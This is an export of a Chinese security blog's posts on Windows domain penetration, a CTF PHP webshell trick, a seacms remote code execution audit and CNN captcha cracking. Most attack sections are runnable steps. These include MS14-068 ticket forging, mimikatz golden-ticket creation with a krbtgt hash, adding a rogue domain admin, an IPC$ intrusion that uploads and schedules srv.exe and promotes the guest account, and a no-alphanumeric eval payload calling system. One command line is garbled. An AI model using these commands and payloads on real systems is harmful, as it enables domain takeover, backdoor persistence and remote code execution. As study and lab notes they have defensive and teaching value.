(key distribution center) key分配中心，受信任的第三方 AS (the Authentication Server) 认证服务 TGS (Ticket Granting Service) 票据授予服务 TGT (ticket-granting ticket) 票据那么从上面的层次可以大概了解到，KDC作为kerberos协议信任的第三方，包括AS和TGS,而TGT票据是由TGS授予的。 证明自己的过程Client向KDC发送自己的身份信息，KDC从Ticket Granting Service得到TGT(ticket-granting ticket)， 并用协议开始前Client与KDC之间的密钥将TGT加密回复给Client。此时只有真正的Client才能利用它与KDC之间的密钥将加密后的TGT解密，从而获得TGT。（此过程避免了Client直接向KDC发送密码，以求通过验证的不安全方式） 请求他人的过程Client利用之前获得的TGT向KDC请求其他Service的Ticket，从而通过其他Service的身份鉴别。 1． Client将之前获得TGT和要请求的服务信息(服务名等)发送给KDC，KDC中的Ticket Granting Service将为Client和Service之间生成一个Session Key用于Service对Client的身份鉴别。然后KDC将这个Session Key和用户名，用户地址（IP），服务名，有效期, 时间戳一起包装成一个Ticket(这些信息最终用于Service对Client的身份鉴别)发送给Service， 不过Kerberos协议并没有直接将Ticket发送给Service，而是通过Client转发给Service.所以有了第二步。2． 此时KDC将刚才的Ticket转发给Client。由于这个Ticket是要给Service的，不能让Client看到，所以KDC用协议开始前KDC与Service之间的密钥将Ticket加密后再发送给Client。同时为了让Client和Service之间共享那个秘密(KDC在第一步为它们创建的Session Key)， KDC用Client与它之间的密钥将Session Key加密随加密的Ticket一起返回给Client。3． 为了完成Ticket的传递，Client将刚才收到的Ticket转发到Service. 由于Client不知道KDC与Service之间的密钥，所以它无法算改Ticket中的信息。同时Client将收到的Session Key解密出来，然后将自己的用户名，用户地址（IP）打包成Authenticator用Session Key加密也发送给Service。4． Service 收到Ticket后利用它与KDC之间的密钥将Ticket中的信息解密出来，从而获得Session Key和用户名，用户地址（IP），服务名，有效期。然后再用Session Key将Authenticator解密从而获得用户名，用户地址（IP）将其与之前Ticket中解密出来的用户名，用户地址（IP）做比较从而验证Client的身份。5． 如果Service有返回结果，将其返回给Client。 上面是标准Kerberos协议的基本流程，MIT也实现了一套标准的Kerberos协议，而微软在Windows平台上的Kerberos并没有采用MIT的实现，而是对Kerberos协议进行了一些扩充，其中最重要的扩充就是增加了认证过程中的权限认证，也就是在协议中增加了PAC（PrivilegeAttribute Certificate），特权属性证书。 0X03 信息收集 常用命令12345678910111213141516171819202122232425262728293031323334353637383940ipconfig /all ------ 查询本机IP段，所在域等net user ------ 本机用户列表net localgroup administrators ------ 本机管理员[通常含有域用户]net user /domain ------ 查询域用户net group /domain ------ 查询域里面的工作组net group "domain admins" /domain ------ 查询域管理员用户组net localgroup administrators /domain ------ 登录本机的域管理员net localgroup administrators workgroup\user001 /add ------域用户添加到本机net group "domain controllers" /domain ------ 查看域控制器(如果有多台)net time /domain ------ 判断主域，主域服务器都做时间服务器net config workstation ------ 当前登录域net session ------ 查看当前会话net use \\ip\ipc$ pawword /user:username ------ 建立IPC会话net share ------ 查看SMB指向的路径[即共享]net view ------ 查询同一域内机器列表net view \\ip ------ 查询某IP共享net view /domain ------ 查询域列表net view /domain:domainname ------ 查看workgroup域中计算机列表net start ------ 查看当前运行的服务net accounts ------ 查看本地密码策略net accounts /domain ------ 查看域密码策略nbtstat –A ip ------netbios 查询netstat –an/ano/anb ------ 网络连接查询route print ------ 路由表tasklist /V ----- 查看进程[显示对应用户]tasklist /S ip /U domain\username /P /V ----- 查看远程计算机进程列表qprocess * ----- 类似tasklistqprocess /SERVER:IP ----- 远程查看计算机进程列表nslookup –qt-MX Yahoo.com ----- 查看邮件服务器whoami /all ----- 查询当前用户权限等set ----- 查看系统环境变量systeminfo ----- 查看系统信息qwinsta ----- 查看登录情况qwinsta /SERVER:IP ----- 查看远程登录情况fsutil fsinfo drives ----- 查看所有盘符gpupdate /force ----- 更新域策略 0x04 获取域管理员权限：MS14-068ms14-068漏洞在域控没有打补丁（kb3011780）时，能将任意域用户，提升为域管理员权限。 该漏洞利用是通过客户端来伪造高权限的PAC产生的。详细介绍：深入解读MS14-068漏洞补充：添加域用户MS14-068 域用户权限提升漏洞复现 神器mimikatz 12privilege::debugsekurlsa::logonpasswords ms14068.exe 伪造kerberos票据1net group "domain controllers" /domain 获取计算机名称 12ms14-068.exe -u test@domaintest.com -p 123456 -s S-1-5-21-1607545464-3564583392-2085136103-1114-d WIN-0IQJV7P073G.domaintest.com mimikatz 导入票据 1mimikatz.exe "kerberos::ptc TGT_test@domaintest.com.ccache" exit 拿到域管理权限便可进行其他一系列操作123456dir \\WIN-0IQJV7P073G.domaintest.com\c$ 注意这里应为域控主机名称，不能为ipnet user admin xxxxx@password /add /domainnet group "Domain Admins" admin /add /domainPsExec.exe \\192.168.111.129 cmd.exe 0x05 权限维持：黄金票据原理每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，不就可以随意伪造Ticket了吗？ 实际上只要拿到了域控权限，在上面就可以很容易的获得krbtgt的Hash值，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket 获取krbtgt1mimikatz log "lsadump::dcsync /domaintest.com /user:krbtgt" 构造黄金票据并注入内存1234mimikatz # kerberos::purgemimikatz # kerberos::golden /admin:Administrator /domain:domaintest.com /sid:S-1-5-21-3883552807-251258116-2724407435 /krbtgt:6a8e501fabcf264c70ef3316c6aab7dc /ticket:Administrator.kiribimimikatz # kerberos::ptt Administrator.kiribimimikatz # kerberos::tgt 当然除了golden ticket，silver ticket之外还有kerberos ticket，历史SID，AdminSDHolder，DSRM，GPP，DCSync等技术手段都可以用来当做域控的隐藏后门。 参考文章 域渗透——Pass The Ticket l3m0n:从零开始内网渗透学习 初级域渗透系列 - 01. 基本介绍&amp;信息获取 初级域渗透系列 - 02. 常见攻击方法 - 1 初级域渗透系列 - 03. 常见攻击方法]]></content>
      <categories>
        <category>windows安全</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[域环境搭建]]></title>
    <url>%2F%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[万事开头难，想学习一下域渗透，自己搭建个域是比较方便的，搭建过程中遇到的一些问题记录一下。 在本次环境中域控主机为windows server 2008 r2，域成员为 windows xp. Windows2008R2中创建域控制器参考文章Windows2008如何配置域控制器(活动目录)主要命令dcpromo然后根据需要下一步即可。 域成员的加入，需要注意的是： 配置成员主机与控制在同一ip段 配置成员主机dns为域控ip（域控主机被设置为DNS服务器） 在我的电脑-属性-电脑名称中修改domain即可，输入域控主机名字然后弹出窗口输入账号密码即可。 那么在加入域之后有什么变化呢？ 其中比较明显的就是在登陆的时候，可以发现xp传统的登陆界面没有了。而出现了一个登陆界面，在这个界面中可可以选择以域内其他成员的身份登陆主机。]]></content>
      <categories>
        <category>windows安全</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kerberos认证过程]]></title>
    <url>%2Fkerberos%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[简单介绍kerberos一词原意为希腊神话中守护地狱之门的一条三头神犬。麻省理工学院在雅典娜计划中以此为名，提出了并实现了用于计算机网络的身份认证协议。以kerberos为名，显示了该协议具有相当的安全性。 功能 一个安全认证协议 用tickets验证 避免本地保存密码和在互联网上传输密码 包含一个可信任的第三方 使用对称加密 客户端与服务器之间能够相互验证 以上的特点表明，Kerberos只提供一种功能——在网络上安全的完成用户的身份验证 认证过程kerberos协议的认证过程可以两个部分： 证明自己 请求他人 在说明kerberos的认证过程之前，先简单介绍几个基本的名词。 KDC (key distribution center) key分配中心，受信任的第三方 AS (the Authentication Server) 认证服务 TGS (Ticket Granting Service) 票据授予服务 TGT (ticket-granting ticket) 票据 那么从上面的层次可以大概了解到，KDC作为kerberos协议信任的第三方，包括AS和TGS,而TGT票据是由TGS授予的。 证明自己的过程Client向KDC发送自己的身份信息，KDC从Ticket Granting Service得到TGT(ticket-granting ticket)， 并用协议开始前Client与KDC之间的密钥将TGT加密回复给Client。此时只有真正的Client才能利用它与KDC之间的密钥将加密后的TGT解密，从而获得TGT。（此过程避免了Client直接向KDC发送密码，以求通过验证的不安全方式） 请求他人的过程Client利用之前获得的TGT向KDC请求其他Service的Ticket，从而通过其他Service的身份鉴别。 1． Client将之前获得TGT和要请求的服务信息(服务名等)发送给KDC，KDC中的Ticket Granting Service将为Client和Service之间生成一个Session Key用于Service对Client的身份鉴别。然后KDC将这个Session Key和用户名，用户地址（IP），服务名，有效期, 时间戳一起包装成一个Ticket(这些信息最终用于Service对Client的身份鉴别)发送给Service， 不过Kerberos协议并没有直接将Ticket发送给Service，而是通过Client转发给Service.所以有了第二步。2． 此时KDC将刚才的Ticket转发给Client。由于这个Ticket是要给Service的，不能让Client看到，所以KDC用协议开始前KDC与Service之间的密钥将Ticket加密后再发送给Client。同时为了让Client和Service之间共享那个秘密(KDC在第一步为它们创建的Session Key)， KDC用Client与它之间的密钥将Session Key加密随加密的Ticket一起返回给Client。3． 为了完成Ticket的传递，Client将刚才收到的Ticket转发到Service. 由于Client不知道KDC与Service之间的密钥，所以它无法算改Ticket中的信息。同时Client将收到的Session Key解密出来，然后将自己的用户名，用户地址（IP）打包成Authenticator用Session Key加密也发送给Service。4． Service 收到Ticket后利用它与KDC之间的密钥将Ticket中的信息解密出来，从而获得Session Key和用户名，用户地址（IP），服务名，有效期。然后再用Session Key将Authenticator解密从而获得用户名，用户地址（IP）将其与之前Ticket中解密出来的用户名，用户地址（IP）做比较从而验证Client的身份。5． 如果Service有返回结果，将其返回给Client。]]></content>
      <categories>
        <category>windows安全</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kerberos黄金票据]]></title>
    <url>%2Fkerberos%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%2F</url>
    <content type="text"><![CDATA[原理每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，不就可以随意伪造Ticket了吗？ 实际上只要拿到了域控权限，在上面就可以很容易的获得krbtgt的Hash值，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket 获取krbtgt1mimikatz log "lsadump::dcsync /domaintest.com /user:krbtgt" 构造黄金票据并注入内存1234mimikatz # kerberos::purgemimikatz # kerberos::golden /admin:Administrator /domain:domaintest.com /sid:S-1-5-21-3883552807-251258116-2724407435 /krbtgt:6a8e501fabcf264c70ef3316c6aab7dc /ticket:Administrator.kiribimimikatz # kerberos::ptt Administrator.kiribimimikatz # kerberos::tgt 当然除了golden ticket，silver ticket之外还有kerberos ticket，历史SID，AdminSDHolder，DSRM，GPP，DCSync等技术手段都可以用来当做域控的隐藏后门。 域渗透——Pass The Ticket]]></content>
      <categories>
        <category>windows安全</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[域渗透：MS14-068]]></title>
    <url>%2F%E5%9F%9F%E6%B8%97%E9%80%8F%EF%BC%9AMS14-068%2F</url>
    <content type="text"><![CDATA[ms14-068漏洞在域控没有打补丁（kb3011780）时，能将任意域用户，提升为域管理员权限。详细介绍：深入解读MS14-068漏洞 补充：添加域用户MS14-068 域用户权限提升漏洞复现 ms14068.exe 伪造kerberos票据12ms1m 4068.exe -u test@domaintest.com -p 123456 -s S-1-5-21-1607545464-3564583392-2085136103-1114-d WIN-0IQJV7P073G.domaintest.com mimikatz 导入票据 1mimikatz.exe "kerberos::ptc TGT_test@domaintest.com.ccache" exit 拿到域管理权限便可进行其他一系列操作123456dir \\WIN-0IQJV7P073G.domaintest.com\c$ 注意这里应为域控主机名称，不能为ipnet user admin xxxxx@password /add /domainnet group "Domain Admins" admin /add /domainPsExec.exe \\192.168.111.129 cmd.exe]]></content>
      <categories>
        <category>windows安全</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[域渗透 IPC$]]></title>
    <url>%2F%E5%9F%9F%E6%B8%97%E9%80%8F-IPC%2F</url>
    <content type="text"><![CDATA[IPC$(Internet Process Connection)是共享”命名管道”的资源(大家都是这么说的)，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限,在远程管理计算机和查看计算机的共享资源时使用。 IPC$漏洞：ipc$连接建立后，被连接的主机没有把对方的活动限制在进程间通信范围内，而是允许对方越权访问非IPC$的共享资源。 ipc$甚至可以以空连接的形式进行连接，即可以不使用用户名，密码进行连接。虽然空连接没有任何权限，但是可以得到目标主机上的用户列表，作为信息收集，为进一步的渗透做准备。 ipc$的一些命令 12345678910net share //查看是否开启IPC$net share ipc$ //开启ipc$net share ipc$ /del //关闭ipc$共享net use \\ip\ipc$ ""/user:"" //建立空连接net use \\ip\ipc$ "password"/user:"username" //建立连接 net use z: \\ip\admin$ //映射目标主机admin$(windows)目录到本地z盘 net use \\IP\ipc$ /del //删除一个ipc$连接net use z: /del //删除映射目录 经典入侵模式 123456789101112131415161718192021222324252627282930313233343536371. C:\&gt;net use \\127.0.0.1\IPC$ "" /user:"admintitrators" 这是用《流光》扫到的用户名是administrators，密码为"空"的IP地址(空口令?哇,运气好到家了)，如果是打算攻击的话，就可以用这样的 命令来与127.0.0.1建立一个连接，因为密码为"空"，所以第一个引号处就不用输入，后面一个双引号里的是用户名，输入 administrators，命令即可成功完成。2. C:\&gt;copy srv.exe \\127.0.0.1\admin$ 先复制srv.exe上去，在流光的Tools目录下就有（这里的$是指admin用户的c:\winnt\system32\，大家还可以使用c$、 d$，意思是C盘与D盘，这看你要复制到什么地方去了）。3. C:\&gt;net time \\127.0.0.1 查查时间，发现127.0.0.1 的当前时间是 2002/3/19 上午 11:00，命令成功完成。4. C:\&gt;at \\127.0.0.1 11:05 srv.exe 用at命令启动srv.exe吧（这里设置的时间要比主机时间快，不然你怎么启动啊，呵呵！）5. C:\&gt;net time \\127.0.0.1再查查到时间没有？如果127.0.0.1 的当前时间是 2002/3/19 上午 11:05，那就准备开始下面的命令。6. C:\&gt;telnet 127.0.0.1 99 这里会用到Telnet命令吧，注意端口是99。Telnet默认的是23端口，但是我们使用的是SRV在对方计算机中为我们建立一个99端口的 Shell。虽然我们可以Telnet上去了，但是SRV是一次性的，下次登录还要再激活！所以我们打算建立一个Telnet服务！这就要用到ntlm了7.C:\&gt;copy ntlm.exe \\127.0.0.1\admin$用Copy命令把ntlm.exe上传到主机上（ntlm.exe也是在《流光》的Tools目录中）。8. C:\WINNT\system32&gt;ntlm 输入ntlm启动（这里的C:\WINNT\system32&gt;指的是对方计算机，运行ntlm其实是让这个程序在对方计算机上运行）。当出 现"DONE"的时候，就说明已经启动正常。然后使用"net start telnet"来开启Telnet服务！9. Telnet 127.0.0.1，接着输入用户名与密码就进入对方了，操作就像在DOS上操作一样简单！(然后你想做什么?想做什么就做什么吧,哈哈)为了以防万一,我们再把guest激活加到管理组 10. C:\&gt;net user guest /active:yes 将对方的Guest用户激活11. C:\&gt;net user guest 1234 将Guest的密码改为1234,或者你要设定的密码12. C:\&gt;net localgroup administrators guest /add 将Guest变为Administrator^_^(如果管理员密码更改，guest帐号没改变的话，下次我们可以用guest再次访问这台计算机) 参考文档：https://wenku.baidu.com/view/fffd65fd77eeaeaad1f34693daef5ef7ba0d127f.html]]></content>
      <categories>
        <category>windows安全</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[无字母数字shell]]></title>
    <url>%2F%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97shell%2F</url>
    <content type="text"><![CDATA[最近看到一个ctf题目，关于无字母数字获取shell的，记录一下12345678910111213141516&lt;?phpinclude 'flag.php';if(isset($_GET['code']))&#123; $code = $_GET['code']; if(strlen($code)&gt;40)&#123; die("Long."); &#125; if(preg_match("/[A-Za-z0-9]+/",$code))&#123; die("NO."); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;//$hint = "php function getFlag() to get flag";?&gt; 代码进行了字母数字过滤，并且限制了输入长度。那么按照我们利用异或和php弱类型的一些特性，将符号转换为字母，再拼接函数，或者我们想要利用的webshell;下面进行简单的演示：123456echo 'g'^'&lt;'; // 输出结果为 [ echo '['^'&lt;'; // 这样便可以得到 gecho ('['^'&lt;').(':'^'_'); // 拼接之后得到 geecho '[:'^'&lt;_'; // 为了减少长度，这样同样可以输出与上面相同的效果 geecho '[:[:,_]'^'&lt;_/|@&gt;:';// 构造出getFlag,而此时仅用了19个字符的长度 那么重点来了，既然我们已经构造出了getFlag，再加个()，拼接进去()不是就能直接读取题目的flag了,确实是这样，但如果直接拼进字符串是没有效果的，其只能作为字符串而不能被当作函数，我们还要进行适当的拼接。12$_ = '[:[:,_]'^'&lt;_/|@&gt;:'; // getFlag$_(); // getFlag() 这样就会变成函数了 那么我们最终的payload即为：?code=$=’[:[:,]’^’&lt;/|@&gt;:’;$(); 这样仅仅是调用了一个输出flag的函数，那么我们要是在实际环境中想继续利用的话，我们需要构造出一个webshell。12$_="`&#123;&#123;&#123;"^"?&lt;&gt;/"; // _GET$&#123;$_&#125;[_]($&#123;$_&#125;[__]); // $_GET[_]($GET_[__]) 这样就突破了code的长度限制，利用get传入两个变量，一个作为函数名，一个作为函数参数。就可以实现一个任意代码执行了。例如利用system执行系统命令1?code=$_="`&#123;&#123;&#123;"^"?&lt;&gt;/";$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=system&amp;__=whoami]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[seacms v6.45 前台任意代码执行漏洞]]></title>
    <url>%2Fseacms-v6-45-%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[漏洞代码出现在/include/main.class.php第3098行的parseIf()函数，该函数主要目的为对传进来的参数$content进行匹配，匹配出符合规则的if语句，带入eval()函数执行。相关代码如下：123456789101112131415161718192021 $labelRule = buildregx("&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;","is");$labelRule2="&#123;elseif";$labelRule3="&#123;else&#125;";preg_match_all($labelRule,$content,$iar);$arlen=count($iar[0]);$elseIfFlag=false;for($m=0;$m&lt;$arlen;$m++)&#123; $strIf=$iar[1][$m]; $strIf=$this-&gt;parseStrIf($strIf); $strThen=$iar[2][$m]; $strThen=$this-&gt;parseSubIf($strThen); if (strpos($strThen,$labelRule2)===false)&#123; if (strpos($strThen,$labelRule3)&gt;=0)&#123; $elsearray=explode($labelRule3,$strThen); $strThen1=$elsearray[0]; $strElse1=$elsearray[1]; @eval("if(".$strIf.")&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;"); $test1 = "if(".$strIf.")&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;"; if ($ifFlag)&#123; $content=str_replace($iar[0][$m],$strThen1,$content);&#125; else &#123;$content=str_replace($iar[0][$m],$strElse1,$content);&#125; &#125;else&#123; @eval("if(".$strIf.") &#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;"); 可以看出在该函数中，对带入eval函数的内容未做任何过滤，存在任意代码执行的隐患。我们只需要构造$strIf=1)phpinfo();if(1的形式那么就可以执行任意代码了。想法很美好，那么就看看有没有我们可以控制的地方。全局查找该函数，可以发现有很多出调用的地方，在前台搜索处echoSearchPage()函数中，有用户可以控制的变量，跟进search.php查看一下。在212行，$content变量传入parseIf()函数 1$content=$mainClassObj-&gt;parseIf($content); 而往前查看，会发现有很多可控的变量代入了$content中。12345$content = str_replace("&#123;searchpage:page&#125;",$page,$content);$content = str_replace("&#123;seacms:searchword&#125;",$searchword,$content);$content = str_replace("&#123;seacms:searchnum&#125;",$TotalResult,$content);$content = str_replace("&#123;searchpage:ordername&#125;",$order,$content);...... 而这里的$order变量被定义为global变量，而在search.php的开始位置处，对$$_GET传入的变量进行了变量注册。12345foreach($_GET as $k=&gt;$v)&#123; $$k=_RunMagicQuotes(gbutf8(RemoveXSS($v))); $schwhere.= "&amp;$k=".urlencode($$k);&#125; 那么按照我们的预想，$order直接通过str_replace()函数进入了$content，而$content又直接进入带有eval的parseIf()函数。只需要根据$labelRule = buildregx(“{if:(.?)}(.?){end if}”,”is”);构造符合规则的payload就可以爽歪歪了。 在此之前，通过打印$content，可以发现$order传入之后类似这样1&#123;if:"$order"=="time"&#125; 那么根据前边贴出的代码@eval(“if(“.$strIf.”) { \$ifFlag=true;} else{ \$ifFlag=false;}”);，我们需要构造的是$strIf，而它截取的便是”$order”==”time”这部分。那么我们需要符合正则匹配，并且闭合eval中原有的语句，再就很容易构造出payload的形式：}{end if} {if:1)phpinfo();if(1}{end if}但是我们提交之后发现并没有按照预期的来，在$content中，我们传入的$order变成了 {if:”}{end if} {if:1)phpinfo();if(1}{end if}”==”score”} 可以发现在if：中间多了个,那么这就导致这部分内容无法通过正则匹配，也就没有进入eval获得执行。 往前翻其实就可以发现，在GET传进来参数进行注册变量的时候，其实是对注册的变量的变量做了过滤的。1$$k=_RunMagicQuotes(gbutf8(RemoveXSS($v))); 而这个RemoveXSS()不仅是做了xss的过滤，跟进代码查看一下其中一处过滤1$ra1 = Array('_GET','_POST','_COOKIE','_REQUEST','if:','javascript', 'vbscript', 'expression', 'applet', 'meta', 'xml', 'blink', 'link', 'style', 'script', 'embed', 'object', 'iframe', 'frame', 'frameset', 'ilayer', 'layer', 'bgsound', 'title', 'base', 'eval', 'passthru', 'exec', 'assert', 'system', 'chroot', 'chgrp', 'chown', 'shell_exec', 'proc_open', 'ini_restore', 'dl', 'readlink', 'symlink', 'popen', 'stream_socket_server', 'pfsockopen', 'putenv', 'cmd'); 在这里可以找到我们传入的if:，在下面的代码就是对if:中间插入,使得其失去了原本的意义。很明显，开发者在使用eval函数的时候考虑到了这个问题。对传入其中的参数做了合适的过滤。 漏洞出现的原因是因为对问题考虑的不够全面。按照吴翰清的说法便是没有做好“威胁分析”，虽然开发者对传入的GET参数做足了过滤，但却没有考虑post的情况，因为表面上在这里并没有用到POST，但很不巧的是，继续分析可以看到一处require_once(“include/common.php”);文件包含了进来。而正是在这个common.php中，出现了POST。123456789101112foreach($_REQUEST as $_k=&gt;$_v)&#123; echo m_eregi('^(cfg_|GLOBALS)',$_k); if( strlen($_k)&gt;0 &amp;&amp; m_eregi('^(cfg_|GLOBALS)',$_k) &amp;&amp; !isset($_COOKIE[$_k]) ) &#123; exit('Request var not allow!'); &#125;&#125;foreach(Array('_GET','_POST','_COOKIE') as $_request)&#123; foreach($$_request as $_k =&gt; $_v) $&#123;$_k&#125; = _RunMagicQuotes($_v);&#125; 在这里仅仅对$_REQUEST传来的参数做了是否与全局变量冲突的检查和使用了addslashes()做了简单的转义。那么就可以POST传入我们前边准备好的payload。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>seacms</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tensorflow 基于CNN模型的验证码识别]]></title>
    <url>%2Ftensorflow-%E5%9F%BA%E4%BA%8ECNN%E6%A8%A1%E5%9E%8B%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB%2F</url>
    <content type="text"><![CDATA[仅以此文记录深度学习入门过程。 介绍深度学习（Deep learing）是近几年比较火的一个概念，而验证码安全在web安全中也有着重要的地位，那么本文将二者结合，将验证码的识别，作为深度学习的一个入门。 工欲善其事必先利其器，在这里介绍一个谷歌研发的开源机器学习框架—Tensorflow tensorflow使用教程 开工1. 数据预处理 数据准备首先准备大量的图片验证码，将其分为训练集和验证集。六万验证码 网盘密码d3iq训练集用于神经网络的训练，验证集用于验证正确率。 为什么要分开 ？？ 否则会造成污染，导致模型已认识这个数据了 数据处理 图片处理 标签处理 —&gt;标签向量化 12345678910111213141516171819202122232425262728def text2vec(text): """ 文本转向量 Parameters: text:文本 Returns: vector:向量 """ if len(text) &gt; 4: raise ValueError('验证码最长4个字符') vector = np.zeros(4 * 63) def char2pos(c): if c =='_': k = 62 return k k = ord(c) - 48 if k &gt; 9: k = ord(c) - 55 if k &gt; 35: k = ord(c) - 61 if k &gt; 61: raise ValueError('No Map') return k for i, c in enumerate(text): idx = i * 63 + char2pos(c) vector[idx] = 1 return vector 2.CNN卷积神经网络通俗理解 特点：卷积神经网络引入卷积核解决图像数据非常大而产生的网络参数非常大问题。卷积神经网络组成 1234567卷积层（Convolution）激活层（Activation）池化层（Pooling）完全连接层（Fullyconnected） 卷积层 卷积核 一个有着固定取值的卷积核对图像矩阵进行扫描 在图像识别领域，卷积神经网络中的卷积核（滤镜）要实现的就是，将图像中的特征提取出来。 在最初的卷积层中，成千上万的神经元充当第一组过滤器，搜寻图像中的每个部分和像素，找出模式（pattern）。随着越来越多的图像被处理，每个神经元逐渐学习过滤特定的特征，这提高了准确性。 比如图像是苹果，一个过滤器可能专注于发现“红色”这一颜色，而另一个过滤器可能会寻找圆形边缘，另一个过滤器则会识别细细的茎。卷积层就是通过将图像分解成不同的特征来做这件事的。 具体怎么提取？ 以猫为例，显著特征是圆眼睛三角耳朵尖下巴，但是总体来说狐狸也长这个样子，只是耳朵更大，下巴更尖而已。这些细小的区别很难描述。 池化层 整个图像中的这种“卷积”会产生大量的信息，这可能会很快成为一个计算噩梦。 为了描述大的图像，一个很自然的想法就是对不同位置的特征进行聚合统计，例如，人们可以计算图像一个区域上的某个特定特征的平均值 (或最大值)。这些概要统计特征不仅具有低得多的维度 (相比使用所有提取得到的特征)，同时还会改善结果(不容易过拟合)。这种聚合的操作就叫做池化 (pooling) 进入池化层，可将其全部缩小成更通用和可消化的形式。有很多方法可以解决这个问题，但最受欢迎的是“最大池”（MaxPooling） 全连接层全连接就是个矩阵乘法，相当于一个特征空间变换，可以把有用的信息提取整合。全连接层一般在卷积网络的最后。 当然通过这些特征得到的结果不一定是正确的，因此需要一个‘反向传播的过程’对得到的结果进行‘纠正’。 反向传播将反馈发送到上一层的节点，告诉它答案差了多少。然后，该层再将反馈发送到上一层，再传到上一层，直到它回到卷积层，来进行调整，以帮助每个神经元在随后的图像在网络中传递时更好地识别数据。 这个过程一直反复进行，直到神经网络以更准确的方式识别图像中的苹果和橘子，最终以100％的正确率预测结果——尽管许多工程师认为85％是可以接受的。这时，神经网络已经准备好了，可以开始真正识别图片中的苹果了。 代码实现 3卷积层+1全连接层12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576def crack_captcha_cnn(self, w_alpha=0.01, b_alpha=0.1): """ 定义CNN Parameters: w_alpha:权重系数 b_alpha:偏置系数 Returns: out:CNN输出 """ # 卷积的input: 一个Tensor。数据维度是四维[batch, in_height, in_width, in_channels] # 具体含义是[batch大小, 图像高度, 图像宽度, 图像通道数] # 因为是灰度图，所以是单通道的[?, 100, 30, 1] x = tf.reshape(self.X, shape=[-1, self.heigth, self.width, 1]) # 卷积的filter:一个Tensor。数据维度是四维[filter_height, filter_width, in_channels, out_channels] # 具体含义是[卷积核的高度, 卷积核的宽度, 图像通道数, 卷积核个数] w_c1 = tf.Variable(w_alpha*tf.random_normal([3, 3, 1, 32])) # 偏置项bias b_c1 = tf.Variable(b_alpha*tf.random_normal([32])) # conv2d卷积层输入: # strides: 一个长度是4的一维整数类型数组，每一维度对应的是 input 中每一维的对应移动步数 # padding：一个字符串，取值为 SAME 或者 VALID 前者使得卷积后图像尺寸不变, 后者尺寸变化 # conv2d卷积层输出: # 一个四维的Tensor, 数据维度为 [batch, out_width, out_height, in_channels * out_channels] # [?, 100, 30, 32] # 输出计算公式H0 = (H - F + 2 * P) / S + 1 # 对于本卷积层而言,因为padding为SAME,所以P为1。 # 其中H为图像高度,F为卷积核高度,P为边填充,S为步长 # 学习参数: # 32*(3*3+1)=320 # 连接个数: # (输出图像宽度*输出图像高度)(卷积核高度*卷积核宽度+1)*卷积核数量(100*30)(3*3+1)*32=100*30*320=960000个 # bias_add:将偏差项bias加到value上。这个操作可以看做是tf.add的一个特例，其中bias是必须的一维。 # 该API支持广播形式，因此value可以是任何维度。但是，该API又不像tf.add，可以让bias的维度和value的最后一维不同， conv1 = tf.nn.relu(tf.nn.bias_add(tf.nn.conv2d(x, w_c1, strides=[1, 1, 1, 1], padding='SAME'), b_c1)) # max_pool池化层输入： # ksize:池化窗口的大小，取一个四维向量，一般是[1, height, width, 1] # 因为我们不想在batch和channels上做池化，所以这两个维度设为了1 # strides:和卷积类似，窗口在每一个维度上滑动的步长，一般也是[1, stride,stride, 1] # padding:和卷积类似，可以取'VALID' 或者'SAME' # max_pool池化层输出： # 返回一个Tensor，类型不变，shape仍然是[batch, out_width, out_height, in_channels]这种形式 # [?, 50, 15, 32] # 学习参数: # 2*32 # 连接个数: # 15*50*32*(2*2+1)=120000 conv1 = tf.nn.max_pool(conv1, ksize=[1, 2, 2, 1], strides=[1, 2, 2, 1], padding='SAME') w_c2 = tf.Variable(w_alpha*tf.random_normal([3, 3, 32, 64])) b_c2 = tf.Variable(b_alpha*tf.random_normal([64])) # [?, 50, 15, 64] conv2 = tf.nn.relu(tf.nn.bias_add(tf.nn.conv2d(conv1, w_c2, strides=[1, 1, 1, 1], padding='SAME'), b_c2)) # [?, 25, 8, 64] conv2 = tf.nn.max_pool(conv2, ksize=[1, 2, 2, 1], strides=[1, 2, 2, 1], padding='SAME') w_c3 = tf.Variable(w_alpha*tf.random_normal([3, 3, 64, 64])) b_c3 = tf.Variable(b_alpha*tf.random_normal([64])) # [?, 25, 